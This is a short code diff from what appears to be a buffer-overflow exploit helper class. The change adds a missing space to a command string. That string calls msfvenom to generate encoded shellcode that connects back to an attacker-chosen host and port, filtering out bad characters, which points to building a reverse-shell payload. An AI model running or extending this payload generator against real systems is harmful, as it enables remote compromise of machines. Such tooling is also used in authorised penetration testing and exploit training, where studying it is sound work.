@@ -531,7 +531,7 @@ class BOFHelper:
                 return BOFErrorFailure
             self._lIP = ip
 
-        self._shellCode += execute("msfvenom -p %s LHOST=%s LPORT=%d EXITFUNC=thread -f raw –e x86/shikata_ga_nai"
+        self._shellCode += execute("msfvenom -p %s LHOST=%s LPORT=%d EXITFUNC=thread -f raw –e x86/shikata_ga_nai "
                                    "-b \"\\x%s\"" % (ans, self._lIP, self._lPort, "\\x".join(self._badChars)))
         self._shellCodeGenerated = True
         return BOFErrorSuccess
